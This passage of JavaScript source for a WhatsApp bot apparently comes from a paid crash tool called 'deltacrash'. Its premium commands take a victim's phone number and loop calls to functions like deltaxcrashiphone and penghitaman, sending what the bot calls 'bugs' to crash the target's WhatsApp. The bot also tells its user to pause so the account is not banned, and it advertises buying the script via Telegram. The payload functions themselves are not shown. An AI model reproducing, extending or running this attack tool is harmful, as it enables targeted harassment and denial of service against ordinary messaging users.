await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-xl': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-kominfo': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-axis': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-reels': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-xns': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-five': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-wolf': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'network-fels': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
